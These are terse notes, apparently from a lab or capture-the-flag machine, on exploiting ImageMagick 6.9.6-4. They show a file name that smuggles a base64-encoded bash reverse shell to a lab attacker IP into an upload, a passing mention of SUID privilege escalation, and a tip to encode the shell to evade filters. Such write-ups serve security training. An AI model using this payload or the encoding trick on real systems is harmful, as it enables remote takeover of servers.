port 80,
ImageMagick Version: 6.9.6-4
```
When an image containing the pipe ( | ) symbol is uploaded to this version of ImageMagick, whatever comes after the pipe is opened with popen . This means the part after the pipe gets executed as code. I smell the foothold now!
```

make a payload png file

`cp 1.png '|bv"`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDUuMjQ0Lzg4MjEgMD4mMQo= | base64 -d | bash`".png''

Get a shell.

trace with SUID to Priv Es

#### Lesson to learn
- make base64 reverse shell to bypass filter  L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDUuMjQ0Lzg4MjEgMD4mMQo= | base64 -d | bash
